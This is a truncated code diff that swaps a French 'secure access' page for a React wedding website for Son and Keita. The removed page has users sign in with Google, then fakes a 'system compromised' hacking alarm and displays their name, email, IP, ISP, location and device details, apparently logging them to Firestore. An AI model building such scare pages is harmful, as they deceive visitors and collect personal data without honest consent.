@@ -1,587 +1,426 @@
-<!DOCTYPE html>
-<html lang="fr">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Accès Sécurisé</title>
-    <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;600;900&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
-    <style>
-        * { scrollbar-width: none; -ms-overflow-style: none; }
-        *::-webkit-scrollbar { display: none; }
+import React, { useState, useEffect } from 'react';
+import { Heart, Image as ImageIcon, BookHeart, PartyPopper, MessageCircleHeart, Send, Sparkles, Music, Star } from 'lucide-react';
 
-        body { 
-            font-family: 'Outfit', sans-serif; 
-            background-color: #000000;
-            height: 100vh;
-            overflow: hidden;
-            color: white;
-            touch-action: none;
-        }
-
-        .mono { font-family: 'JetBrains Mono', monospace; }
-        .fade-in { opacity: 0; animation: fadeIn 0.8s ease-out forwards; }
-        @keyframes fadeIn { to { opacity: 1; } }
-
-        /* Animation de l'alarme (Flash Rouge par-dessus le Matrix) */
-        .panic-overlay { animation: flashOverlay 0.2s infinite; mix-blend-mode: screen; pointer-events: none; }
-        @keyframes flashOverlay {
-            0%, 49% { background-color: rgba(220, 38, 38, 0.4); } 
-            50%, 100% { background-color: transparent; }
-        }
-
-        /* Texte ERREUR et Crâne qui tremblent (Glitch) */
-        .glitch-item { animation: glitch 0.15s infinite; }
-        @keyframes glitch {
-            0% { transform: translate(0); }
-            20% { transform: translate(-4px, 4px); filter: drop-shadow(2px 0px 0px #0f0); }
-            40% { transform: translate(-4px, -4px); filter: none; }
-            60% { transform: translate(4px, 4px); filter: drop-shadow(-2px 0px 0px #f00); }
-            80% { transform: translate(4px, -4px); filter: none; }
-            100% { transform: translate(0); }
-        }
-        
-        /* Curseur terminal */
-        .cursor-blink { animation: blink 1s step-end infinite; }
-        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
-
-    </style>
-</head>
-<body id="main-body" class="flex flex-col items-center justify-center min-h-screen m-0 p-2 select-none relative transition-colors duration-75">
-
-    <!-- Étape 1 : Authentification Officielle Google directe -->
-    <div id="step-auth" class="w-full h-full absolute inset-0 z-30 flex flex-col items-center justify-center bg-black p-4 transition-opacity duration-500">
-        <h1 class="text-zinc-400 text-2xl md:text-3xl font-mono uppercase tracking-[0.8em] opacity-50 ml-4 mb-12">Level Up</h1>
-        
-        <div class="w-full max-w-sm flex flex-col items-center gap-6 bg-zinc-900/40 p-8 rounded-lg border border-zinc-800 shadow-2xl relative">
-            <p class="text-zinc-400 text-xs text-center font-mono leading-relaxed">Veuillez vérifier votre identité pour accéder au système sécurisé.</p>
-            
-            <!-- Le vrai bouton Google -->
-            <button id="google-auth-btn" class="w-full flex items-center justify-center gap-3 bg-white hover:bg-gray-100 text-gray-800 font-semibold py-3 px-4 border border-gray-400 rounded shadow transition-colors cursor-pointer">
-                <svg width="20" height="20" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 48 48"><path fill="#FFC107" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12c0-6.627,5.373-12,12-12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24c0,11.045,8.955,20,20,20c11.045,0,20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z"/><path fill="#FF3D00" d="M6.306,14.691l6.571,4.819C14.655,15.108,18.961,12,24,12c3.059,0,5.842,1.154,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z"/><path fill="#4CAF50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.19-5.238C29.211,35.091,26.715,36,24,36c-5.202,0-9.619-3.317-11.283-7.946l-6.522,5.025C9.505,39.556,16.227,44,24,44z"/><path fill="#1976D2" d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.087,5.571c0.001-0.001,0.002-0.001,0.003-0.002l6.19,5.238C36.971,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z"/></svg>
-                Se connecter avec Google
-            </button>
-            
-            <div id="auth-error" class="hidden text-red-500 font-mono text-[10px] uppercase tracking-widest mt-2 text-center bg-red-900/30 p-2 rounded border border-red-500/50 w-full"></div>
+// --- Composant des cœurs flottants pour l'animation ---
+const FloatingHearts = () => {
+  return (
+    <div className="absolute inset-0 overflow-hidden pointer-events-none">
+      {[...Array(15)].map((_, i) => (
+        <div
+          key={i}
+          className="absolute animate-float opacity-30"
+          style={{
+            left: `${Math.random() * 100}%`,
+            top: `${Math.random() * 100}%`,
+            animation: `float ${5 + Math.random() * 5}s infinite ease-in-out`,
+            animationDelay: `${Math.random() * 5}s`,
+            transform: `scale(${0.5 + Math.random()})`
+          }}
+        >
+          <Heart fill="#f43f5e" className="text-rose-500" size={24} />
         </div>
+      ))}
+    </div>
+  );
+};
+
+export default function App() {
+  const [activeTab, setActiveTab] = useState('home');
+  const [isPlaying, setIsPlaying] = useState(false);
+
+  // --- Style global injecté pour les animations personnalisées ---
+  useEffect(() => {
+    const style = document.createElement('style');
+    style.innerHTML = `
+      @keyframes float {
+        0%, 100% { transform: translateY(0) scale(1) rotate(0deg); }
+        50% { transform: translateY(-20px) scale(1.05) rotate(3deg); }
+      }
+      @keyframes slideUpFade {
+        from { opacity: 0; transform: translateY(40px); }
+        to { opacity: 1; transform: translateY(0); }
+      }
+      @keyframes scaleIn {
+        from { opacity: 0; transform: scale(0.85); }
+        to { opacity: 1; transform: scale(1); }
+      }
+      @keyframes shimmer {
+        0% { background-position: -200% 0; }
+        100% { background-position: 200% 0; }
+      }
+      @keyframes heartbeat {
+        0%, 100% { transform: scale(1); }
+        15% { transform: scale(1.15); }
+        30% { transform: scale(1); }
+        45% { transform: scale(1.15); }
+        60% { transform: scale(1); }
+      }
+      @keyframes floatItem {
+        0%, 100% { transform: translateY(0); }
+        50% { transform: translateY(-8px); }
+      }
+      
+      .animate-slide-up { animation: slideUpFade 0.8s cubic-bezier(0.16, 1, 0.3, 1) forwards; opacity: 0; }
+      .animate-scale-in { animation: scaleIn 0.7s cubic-bezier(0.16, 1, 0.3, 1) forwards; opacity: 0; }
+      .animate-heartbeat { animation: heartbeat 1.5s ease-in-out infinite; }
+      .animate-float-item { animation: floatItem 4s ease-in-out infinite; }
+      .animate-shimmer-bg {
+        background: linear-gradient(90deg, #f43f5e, #d946ef, #8b5cf6, #f43f5e);
+        background-size: 300% 100%;
+        animation: shimmer 5s linear infinite;
+      }
+      
+      .delay-100 { animation-delay: 100ms; }
+      .delay-200 { animation-delay: 200ms; }
+      .delay-300 { animation-delay: 300ms; }
+      .delay-400 { animation-delay: 400ms; }
+      .delay-500 { animation-delay: 500ms; }
+      .delay-600 { animation-delay: 600ms; }
+
+      .glass-panel {
+        background: rgba(255, 255, 255, 0.75);
+        backdrop-filter: blur(16px);
+        -webkit-backdrop-filter: blur(16px);
+        border: 1px solid rgba(255, 255, 255, 0.8);
+        box-shadow: 0 10px 40px -10px rgba(0,0,0,0.08);
+      }
+      .gradient-text {
+        background: linear-gradient(to right, #db2777, #9333ea);
+        -webkit-background-clip: text;
+        -webkit-text-fill-color: transparent;
+      }
+    `;
+    document.head.appendChild(style);
+    return () => document.head.removeChild(style);
+  }, []);
+
+  // --- Vues de l'application ---
+  const renderContent = () => {
+    switch (activeTab) {
+      case 'home': return <HomeView />;
+      case 'gallery': return <GalleryView />;
+      case 'quiz': return <QuizView />;
+      case 'guestbook': return <GuestbookView />;
+      default: return <HomeView />;
+    }
+  };
+
+  return (
+    <div className="min-h-screen bg-gradient-to-br from-rose-50 via-pink-100 to-purple-100 font-sans text-slate-800 relative pb-24">
+      <FloatingHearts />
+      
+      {/* En-tête */}
+      <header className="pt-8 pb-6 px-4 text-center relative z-10 animate-slide-up">
+        <div className="inline-block p-3 rounded-full bg-white/70 backdrop-blur-md shadow-lg mb-3 animate-float-item border border-white">
+          <Heart className="text-rose-500 animate-heartbeat" size={32} fill="#f43f5e" />
+        </div>
+        <h1 className="text-4xl md:text-6xl font-extrabold tracking-tight mb-2 font-serif animate-slide-up delay-100">
+          <span className="gradient-text">Son & Keita</span>
+        </h1>
+        <p className="text-lg md:text-xl text-rose-700/80 font-medium tracking-wide uppercase animate-slide-up delay-200">
+          Just Married • Pour Toujours
+        </p>
+      </header>
+
+      {/* Contenu principal */}
+      <main className="max-w-4xl mx-auto px-4 relative z-10 min-h-[60vh]">
+        <div className="transition-all duration-500 ease-in-out">
+          {renderContent()}
+        </div>
+      </main>
+
+      {/* Navigation en bas (Mobile & Desktop) */}
+      <nav className="fixed bottom-0 left-0 w-full glass-panel border-t border-white/40 z-50 px-4 py-3 md:py-4 shadow-[0_-10px_40px_rgba(0,0,0,0.05)]">
+        <div className="max-w-md mx-auto flex justify-between items-center">
+          <NavButton id="home" icon={<Heart />} label="Accueil" active={activeTab === 'home'} onClick={() => setActiveTab('home')} />
+          <NavButton id="gallery" icon={<ImageIcon />} label="Galerie" active={activeTab === 'gallery'} onClick={() => setActiveTab('gallery')} />
+          <NavButton id="quiz" icon={<PartyPopper />} label="Quiz" active={activeTab === 'quiz'} onClick={() => setActiveTab('quiz')} />
+          <NavButton id="guestbook" icon={<BookHeart />} label="Livre d'Or" active={activeTab === 'guestbook'} onClick={() => setActiveTab('guestbook')} />
+        </div>
+      </nav>
+    </div>
+  );
+}
+
+// --- Composants secondaires ---
+
+const NavButton = ({ id, icon, label, active, onClick }) => (
+  <button 
+    onClick={onClick}
+    className={`flex flex-col items-center justify-center w-16 h-16 rounded-2xl transition-all duration-300 ${
+      active ? 'bg-gradient-to-tr from-rose-400 to-purple-500 text-white shadow-lg transform -translate-y-2' : 'text-slate-500 hover:bg-white/60 hover:text-rose-500'
+    }`}
+  >
+    <div className={`${active ? 'animate-bounce' : ''}`}>
+      {React.cloneElement(icon, { size: active ? 24 : 22 })}
+    </div>
+    <span className={`text-[10px] mt-1 font-medium ${active ? 'opacity-100' : 'opacity-80'}`}>{label}</span>
+  </button>
+);
+
+// --- VUE : ACCUEIL ---
+const HomeView = () => (
+  <div className="flex flex-col items-center">
+    <div className="w-full max-w-2xl glass-panel rounded-3xl p-8 shadow-xl text-center mb-8 relative overflow-hidden animate-slide-up delay-300 transition-transform duration-500 hover:shadow-2xl hover:-translate-y-1">
+      <div className="absolute -top-10 -right-10 text-rose-200/50 animate-pulse">
+        <Sparkles size={120} />
+      </div>
+      
+      <h2 className="text-3xl font-bold mb-6 text-slate-800">L'aventure commence ! 💍</h2>
+      <p className="text-lg text-slate-600 mb-8 leading-relaxed">
+        Bienvenue dans le petit univers de Son et Keita. Revivez avec nous les meilleurs moments de cette journée inoubliable, testez vos connaissances sur notre couple, et laissez-nous un mot doux pour l'avenir.
+      </p>
+
+      <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-6">
+        <StatBox number="∞" label="Amour" delay="delay-400" />
+        <StatBox number="1" label="Oui" delay="delay-500" />
+        <StatBox number="2" label="Alliances" delay="delay-600" />
+        <StatBox number="100%" label="Bonheur" delay="700ms" />
+      </div>
     </div>
 
-    <!-- Étape 2 : L'écran noir total (Silence de 3 secondes) -->
-    <div id="step-loading" class="hidden absolute inset-0 z-10 bg-black w-full h-full"></div>
-
-    <!-- Étape PANIC MODE : Le Chaos Total avec Matrix en arrière-plan -->
-    <div id="step-panic" class="hidden absolute inset-0 z-40 flex-col items-center justify-center w-full h-full bg-black overflow-hidden cursor-not-allowed">
-        
-        <!-- Le fond Matrix Vert -->
-        <canvas id="matrix-canvas" class="absolute inset-0 z-0 opacity-80 pointer-events-none"></canvas>
-        
-        <!-- Le Flash Rouge Par-dessus -->
-        <div class="absolute inset-0 z-10 panic-overlay"></div>
-
-        <!-- Le contenu central qui glitch -->
-        <div class="relative z-20 flex flex-col items-center pointer-events-none">
-            <!-- Logo Cyber-Skull -->
-            <svg class="w-24 h-24 text-white glitch-item mb-4" style="filter: drop-shadow(0px 0px 20px rgba(255, 255, 255, 0.8));" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">
-                <path d="M12 4C8.5 4 6 6.5 6 10c0 2.5 1 4 2.5 5.5l.5 3.5h6l.5-3.5C17 14 18 12.5 18 10c0-3.5-2.5-6-6-6z" fill="#000000" stroke="currentColor"></path>
-                <polygon points="7.5,10 10.5,11.5 11,8.5" fill="currentColor" stroke="none"></polygon>
-                <polygon points="16.5,10 13.5,11.5 13,8.5" fill="currentColor" stroke="none"></polygon>
-                <polygon points="12,12.5 11,15 13,15" fill="currentColor" stroke="none"></polygon>
-                <line x1="9.5" y1="17" x2="14.5" y2="17" stroke-width="2"></line>
-                <line x1="10.5" y1="16" x2="10.5" y2="18.5" stroke-width="2"></line>
-                <line x1="12" y1="16" x2="12" y2="19" stroke-width="2"></line>
-                <line x1="13.5" y1="16" x2="13.5" y2="18.5" stroke-width="2"></line>
-            </svg>
-
-            <h1 class="text-5xl md:text-7xl font-black font-mono tracking-widest glitch-item text-white">ERREUR</h1>
-            <h2 class="text-lg md:text-xl font-bold font-mono mt-2 text-red-500 uppercase tracking-widest glitch-item mb-8">Système Compromis</h2>
-        </div>
-
-        <!-- Terminal de Piratage Fictif (L'effet "Bloqué") -->
-        <div class="relative z-20 w-[90%] max-w-sm bg-black/90 border border-red-600 rounded p-3 font-mono text-[9px] text-green-500 shadow-[0_0_15px_rgba(220,38,38,0.5)] h-32 overflow-hidden flex flex-col justify-end pointer-events-none">
-            <div id="terminal-content" class="flex flex-col gap-1"></div>
-            <div class="mt-1"><span class="text-white">root@system:~#</span> <span class="cursor-blink bg-green-500 w-2 h-3 inline-block align-middle"></span></div>
-        </div>
+    <div className="w-full max-w-2xl animate-scale-in delay-500 group relative">
+      <div className="absolute inset-0 bg-gradient-to-r from-rose-400 to-purple-500 rounded-3xl blur-xl opacity-20 group-hover:opacity-40 transition-opacity duration-700"></div>
+      <img 
+        src="https://images.unsplash.com/photo-1511285560929-80b456fea0bc?auto=format&fit=crop&w=1000&q=80" 
+        alt="Mariage" 
+        className="w-full h-64 object-cover rounded-3xl shadow-2xl border-4 border-white/80 relative z-10 transition-transform duration-700 group-hover:scale-[1.02]"
+      />
     </div>
 
-    <!-- Étape Finale : La Révélation (Le Rapport au milieu du chaos) -->
-    <div id="step-2" class="hidden bg-white/95 backdrop-blur-md p-3.5 rounded-[1.5rem] shadow-[0_0_50px_rgba(239,68,68,0.8)] w-full max-w-sm flex-col items-center border-2 border-red-500 z-50 text-slate-900 overflow-y-auto max-h-[98vh]">
-        <div class="inline-flex items-center gap-2 bg-red-600 text-white px-4 py-1.5 rounded-full text-[10px] font-black uppercase tracking-[0.2em] mb-2 border border-red-800 text-center mt-2 animate-pulse shadow-lg">
-            <svg class="w-3 h-3" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="3" d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"></path></svg>
-            Compte Compromis
-        </div>
-
-        <h2 class="text-lg font-black text-slate-900 mb-0.5 tracking-tight uppercase">Rapport d'Exposition</h2>
-
-        <!-- Affichage des données Google de l'utilisateur -->
-        <div class="flex items-center gap-3 w-full bg-red-50/50 border border-red-500/30 p-2.5 rounded-xl mt-2 mb-1">
-            <img id="display-user-photo" src="" class="w-12 h-12 rounded-lg border border-red-500 object-cover hidden">
-            <div class="flex flex-col overflow-hidden">
-                <span class="text-[7px] text-red-500 font-bold uppercase tracking-widest mb-0.5">Session Google Aspirée</span>
-                <span id="display-user-nom" class="text-slate-900 font-black text-xs truncate">...</span>
-                <span id="display-user-email" class="text-slate-600 font-mono text-[9px] truncate">...</span>
+    {/* Section des Témoins */}
+    <div className="w-full max-w-2xl mt-12 animate-slide-up" style={{ animationDelay: '800ms' }}>
+      <div className="flex items-center justify-center gap-3 mb-6">
+        <div className="h-px bg-gradient-to-r from-transparent to-rose-300 w-16"></div>
+        <h3 className="text-2xl font-bold text-slate-800 flex items-center gap-2">
+          <Star className="text-rose-400 animate-pulse" size={24} /> 
+          L'Équipe de Choc
+          <Star className="text-rose-400 animate-pulse" size={24} />
+        </h3>
+        <div className="h-px bg-gradient-to-l from-transparent to-rose-300 w-16"></div>
+      </div>
+      
+      <div className="flex flex-wrap justify-center gap-4">
+        {["Ariana", "Jean-Marc", "Berry", "Yvan", "Marcel"].map((name, idx) => (
+          <div 
+            key={idx} 
+            className="glass-panel px-6 py-4 rounded-2xl flex flex-col items-center gap-3 hover:-translate-y-2 hover:shadow-lg hover:shadow-rose-500/20 transition-all duration-300 cursor-default group"
+            style={{ animationDelay: `${idx * 100 + 900}ms` }}
+          >
+            <div className="w-14 h-14 rounded-full bg-gradient-to-br from-rose-300 to-purple-400 flex items-center justify-center text-white font-bold text-xl shadow-inner group-hover:scale-110 transition-transform duration-300">
+              {name.charAt(0).toUpperCase()}
             </div>
-        </div>
+            <span className="font-semibold text-slate-700 group-hover:text-rose-600 transition-colors">{name}</span>
+          </div>
+        ))}
+      </div>
+    </div>
+  </div>
+);
 
-        <div class="w-full space-y-1.5 mt-3">
-            <div class="bg-slate-50 border border-slate-200 rounded-xl p-2.5 grid grid-cols-2 gap-x-3 gap-y-2.5 text-[9px] shadow-inner">
-                <div class="flex flex-col">
-                    <span class="font-bold text-slate-500 uppercase tracking-widest text-[7px] mb-0.5">ID Session</span>
-                    <span id="display-name" class="font-black text-red-600 mono text-[10px]">...</span>
-                </div>
-                <div class="flex flex-col text-right">
-                    <span class="font-bold text-slate-500 uppercase tracking-widest text-[7px] mb-0.5">Heure du Clic</span>
-                    <span id="display-date" class="font-bold text-slate-900 mono">...</span>
-                </div>
+const StatBox = ({ number, label, delay }) => (
+  <div className={`bg-white/60 rounded-2xl p-4 shadow-sm border border-white/80 animate-slide-up ${delay} hover:bg-white hover:scale-105 hover:shadow-md transition-all duration-300 cursor-default`}>
+    <div className="text-2xl font-bold text-rose-600 mb-1">{number}</div>
+    <div className="text-xs text-slate-500 uppercase font-semibold tracking-wider">{label}</div>
+  </div>
+);
 
-                <div class="flex flex-col col-span-2 border-t border-slate-200 pt-2.5">
-                    <div class="flex justify-between items-center mb-1">
-                        <span class="font-bold text-slate-500 uppercase tracking-widest text-[7px]">Réseau / FAI</span>
-                        <span id="display-conn" class="font-bold text-white text-[8px] bg-red-500 px-1.5 py-0.5 rounded">...</span>
-                    </div>
-                    <div class="flex justify-between items-center">
-                        <span id="display-ip" class="font-bold text-slate-900 mono text-[12px] tracking-wider">...</span>
-                        <span id="display-isp" class="font-bold text-slate-700 truncate max-w-[100px]">...</span>
-                    </div>
-                </div>
+// --- VUE : GALERIE ---
+const GalleryView = () => {
+  const photos = [
+    "https://images.unsplash.com/photo-1519741497674-611481863552?auto=format&fit=crop&w=500&q=80", // Alliances
+    "https://images.unsplash.com/photo-1520854221256-17451cc331bf?auto=format&fit=crop&w=500&q=80", // Bouquet
+    "https://images.unsplash.com/photo-1465495976277-4387d4b0b4c6?auto=format&fit=crop&w=500&q=80", // Danse
+    "https://images.unsplash.com/photo-1511895426328-dc8714191300?auto=format&fit=crop&w=500&q=80", // Couple
+    "https://images.unsplash.com/photo-1532712938310-34cb3982ef74?auto=format&fit=crop&w=500&q=80", // Décoration
+    "https://images.unsplash.com/photo-1522673607200-164d1b6ce486?auto=format&fit=crop&w=500&q=80", // Toast
+  ];
 
-                <div class="flex flex-col col-span-2 border-t border-slate-200 pt-2.5">
-                    <span class="font-bold text-slate-500 uppercase tracking-widest text-[7px] mb-1.5">Matériel Détecté</span>
-                    <div class="flex justify-between items-center">
-                        <div class="flex items-center gap-1.5">
-                            <span class="text-slate-400"><svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 3v2m6-2v2M9 19v2m6-2v2M5 9H3m2 6H3m14-6h2m-2 6h2M7 19h10a2 2 0 002-2V7a2 2 0 00-2-2H7a2 2 0 00-2 2v10a2 2 0 002 2zM9 9h6v6H9V9z"></path></svg></span>
-                            <span id="display-cpu" class="font-bold text-slate-800">...</span>
-                        </div>
-                        <div class="flex items-center gap-1.5">
-                            <span class="text-slate-400"><svg class="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 7v10c0 2.21 3.582 4 8 4s8-1.79 8-4V7M4 7c0 2.21 3.582 4 8 4s8-1.79 8-4M4 7c0-2.21 3.582-4 8-4s8 1.79 8 4m0 5c0 2.21-3.582 4-8 4s-8-1.79-8-4"></path></svg></span>
-                            <span id="display-ram" class="font-bold text-slate-800">...</span>
-                        </div>
-                        <div class="flex items-center gap-1.5">
-                            <div id="battery-icon-container" class="text-red-500"></div>
-                            <span id="display-battery" class="font-bold text-slate-800">...</span>
-                        </div>
-                    </div>
-                </div>
+  return (
+    <div className="pb-8">
+      <h2 className="text-3xl font-bold mb-8 text-center text-slate-800 flex items-center justify-center gap-3 animate-slide-up">
+        <ImageIcon className="text-rose-500 animate-float-item" /> Les Souvenirs
+      </h2>
+      <div className="grid grid-cols-2 md:grid-cols-3 gap-4">
+        {photos.map((src, idx) => (
+          <div 
+            key={idx} 
+            className="group relative rounded-2xl overflow-hidden aspect-square shadow-md hover:shadow-2xl hover:z-10 transition-all duration-500 animate-scale-in cursor-pointer"
+            style={{ animationDelay: `${idx * 100 + 100}ms` }}
+          >
+            <img 
+              src={src} 
+              alt={`Souvenir ${idx + 1}`} 
+              className="w-full h-full object-cover transition-transform duration-700 group-hover:scale-110 group-hover:rotate-1"
+            />
+            <div className="absolute inset-0 bg-gradient-to-t from-black/60 via-black/0 to-transparent opacity-0 group-hover:opacity-100 transition-all duration-300 flex items-end justify-center pb-6">
+              <Heart className="text-white transform translate-y-4 group-hover:translate-y-0 transition-all duration-300 hover:text-rose-400 hover:scale-110" fill="currentColor" size={28} />
             </div>
+          </div>
+        ))}
+      </div>
+      <p className="text-center text-sm text-slate-500 mt-8 italic animate-slide-up delay-600">Plus de photos à venir bientôt !</p>
+    </div>
+  );
+};
 
-            <div class="bg-slate-900 p-2.5 rounded-xl flex items-center justify-between text-white shadow-md">
-                <div class="flex items-center gap-2">
-                    <img id="display-flag" src="" alt="Flag" class="hidden w-4 h-2.5 object-cover rounded-sm">
-                    <span id="display-location" class="text-[9px] font-bold uppercase tracking-widest truncate">...</span>
-                </div>
-                <span id="display-browser" class="text-[8px] text-slate-400 font-mono">...</span>
+// --- VUE : QUIZ ---
+const QuizView = () => {
+  const questions = [
+    { q: "Qui a fait le premier pas ?", options: ["Son", "Keita", "Un ami en commun"], answer: 0 },
+    { q: "Quelle est leur destination de lune de miel rêvée ?", options: ["Japon", "Maldives", "New York"], answer: 1 },
+    { q: "Qui est le plus têtu des deux ?", options: ["Son", "Keita", "C'est un match nul !"], answer: 2 },
+    { q: "Quel est leur plat préféré à partager ?", options: ["Pizza", "Sushi", "Burger frites"], answer: 1 }
+  ];
+
+  const [currentQ, setCurrentQ] = useState(0);
+  const [score, setScore] = useState(0);
+  const [showResult, setShowResult] = useState(false);
+  const [selected, setSelected] = useState(null);
+
+  const handleAnswer = (idx) => {
+    setSelected(idx);
+    setTimeout(() => {
+      if (idx === questions[currentQ].answer) setScore(score + 1);
+      
+      if (currentQ < questions.length - 1) {
+        setCurrentQ(currentQ + 1);
+        setSelected(null);
+      } else {
+        setShowResult(true);
+      }
+    }, 800);
+  };
+
+  return (
+    <div className="max-w-lg mx-auto">
+      <div className="glass-panel rounded-3xl p-8 shadow-xl relative overflow-hidden animate-slide-up">
+        {!showResult ? (
+          <div key={currentQ} className="animate-fade-in">
+            <div className="flex justify-between items-center mb-6 text-sm font-bold text-rose-500 uppercase tracking-wider">
+              <span className="animate-pulse">Question {currentQ + 1} / {questions.length}</span>
+              <Star size={18} fill="currentColor" className="animate-float-item" />
             </div>
-
-            <!-- Section IA Gemini -->
-            <div class="mt-4 w-full flex flex-col items-center">
-                <button id="btn-ia-analysis" class="w-full bg-red-900/40 hover:bg-red-800/80 border border-red-500/50 text-red-100 font-mono text-[9px] uppercase tracking-widest py-2 rounded-lg transition-colors flex justify-center items-center gap-2 shadow-[0_0_10px_rgba(239,68,68,0.2)]">
-                    ✨ Évaluation des Dégâts IA ✨
+            <h3 className="text-2xl font-bold text-slate-800 mb-8 animate-slide-up">{questions[currentQ].q}</h3>
+            
+            <div className="space-y-3">
+              {questions[currentQ].options.map((opt, idx) => (
+                <button
+                  key={idx}
+                  onClick={() => handleAnswer(idx)}
+                  className={`w-full text-left p-4 rounded-xl border-2 transition-all duration-300 font-medium animate-slide-up active:scale-95 ${
+                    selected === idx 
+                      ? idx === questions[currentQ].answer 
+                        ? 'bg-green-100 border-green-500 text-green-700 shadow-[0_0_15px_rgba(34,197,94,0.3)] transform scale-[1.02]' 
+                        : 'bg-red-100 border-red-500 text-red-700 transform scale-[0.98]'
+                      : 'bg-white/60 border-transparent hover:border-rose-300 hover:bg-white hover:shadow-md text-slate-700'
+                  }`}
+                  style={{ animationDelay: `${idx * 100 + 100}ms` }}
+                  disabled={selected !== null}
+                >
+                  {opt}
                 </button>
-                <div id="ia-loading" class="hidden mt-3 text-red-500 flex-col items-center gap-2">
-                    <svg class="animate-spin h-5 w-5 text-red-500" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24"><circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle><path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path></svg>
-                    <span class="text-[7px] font-mono tracking-widest uppercase">Analyse du compte compromis...</span>
-                </div>
-                <div id="ia-report-container" class="hidden mt-3 w-full bg-black/95 border border-red-500/50 rounded p-3 relative">
-                    <div class="absolute -top-2 left-2 bg-red-600 text-white text-[6px] px-1 font-bold uppercase tracking-widest">Évaluation Gemini IA</div>
-                    <p id="ia-report-text" class="text-red-400 font-mono text-[8px] leading-relaxed"></p>
-                </div>
+              ))}
             </div>
-
-        </div>
-
-        <p class="text-[9px] font-black text-red-600 uppercase tracking-widest mt-4 mb-2 animate-pulse">Ne cliquez jamais au hasard.</p>
+          </div>
+        ) : (
+          <div className="text-center py-8 animate-scale-in">
+            <PartyPopper size={80} className="text-rose-500 mx-auto mb-6 animate-float-item" />
+            <h3 className="text-3xl font-bold mb-4 animate-slide-up">Quiz Terminé !</h3>
+            <p className="text-xl mb-6 animate-slide-up delay-100">
+              Votre score : <span className="font-bold text-transparent bg-clip-text bg-gradient-to-r from-rose-500 to-purple-600 text-4xl">{score}</span> / {questions.length}
+            </p>
+            <p className="text-slate-600 mb-8 italic animate-slide-up delay-200">
+              {score === questions.length ? "Wow ! Vous connaissez Son & Keita par cœur ! 🏆" : "Pas mal ! Mais il y a encore des choses à découvrir sur les mariés ! ✨"}
+            </p>
+            <button 
+              onClick={() => { setCurrentQ(0); setScore(0); setShowResult(false); setSelected(null); }}
+              className="animate-shimmer-bg text-white font-bold py-4 px-10 rounded-full shadow-lg hover:shadow-rose-500/30 transform hover:-translate-y-1 active:scale-95 transition-all animate-slide-up delay-300"
+            >
+              Rejouer
+            </button>
+          </div>
+        )}
+      </div>
     </div>
+  );
+};
 
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
-        import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
-        // IMPORTATION DE FIREBASE AUTH POUR LA CONNEXION GOOGLE
-        import { getAuth, signInWithPopup, GoogleAuthProvider, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
+// --- VUE : LIVRE D'OR ---
+const GuestbookView = () => {
+  const [messages, setMessages] = useState([
+    { name: "La famille", text: "Félicitations pour ce magnifique mariage ! Que votre vie soit remplie d'amour et de joie.", date: "Aujourd'hui" },
+    { name: "Meilleur témoin", text: "Une journée inoubliable pour un couple en or. Je vous aime ! ❤️", date: "Hier" }
+  ]);
+  const [newName, setNewName] = useState("");
+  const [newMsg, setNewMsg] = useState("");
 
-        const firebaseConfig = {
-            apiKey: "AIzaSyA3LiNjxsV9HTcFd2ghlItTipted9rdQkU",
-            authDomain: "test-9022.firebaseapp.com",
-            projectId: "test-9022",
-            storageBucket: "test-9022.firebasestorage.app",
-            messagingSenderId: "945536290936",
-            appId: "1:945536290936:web:de1437cea95e63cb559d8d"
-        };
+  const handleSubmit = (e) => {
+    e.preventDefault();
+    if (newName.trim() && newMsg.trim()) {
+      setMessages([{ name: newName, text: newMsg, date: "À l'instant" }, ...messages]);
+      setNewName("");
+      setNewMsg("");
+    }
+  };
 
-        const app = initializeApp(firebaseConfig);
-        const db = getFirestore(app);
-        const auth = getAuth(app);
-        const googleProvider = new GoogleAuthProvider();
+  return (
+    <div className="max-w-2xl mx-auto pb-8">
+      <h2 className="text-3xl font-bold mb-8 text-center text-slate-800 flex items-center justify-center gap-3 animate-slide-up">
+        <MessageCircleHeart className="text-rose-500 animate-float-item" /> Livre d'Or
+      </h2>
 
-        const apiKey = ""; // La clé est fournie automatiquement par l'environnement
